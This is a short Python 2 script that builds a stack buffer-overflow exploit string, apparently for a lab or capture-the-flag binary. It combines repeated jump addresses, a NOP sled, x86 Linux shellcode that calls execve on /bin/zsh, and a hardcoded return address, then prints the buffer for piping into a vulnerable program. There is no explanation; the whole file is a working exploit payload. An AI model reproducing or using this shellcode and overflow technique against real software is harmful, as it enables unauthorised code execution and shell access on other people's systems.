#!/usr/bin/env python

import struct
nop = "\x90"
payload = '\x31\xc0\x50\x68\x2f\x7a\x73\x68\x68\x2f\x62\x69' \
            '\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'


jumpAddr = "\x08\xcf\xff\xff"

buff = jumpAddr * 16 + nop * 133 + payload + jumpAddr * 10

returnAddr = "\xb8\xce\xff\xff"

print buff + returnAddr
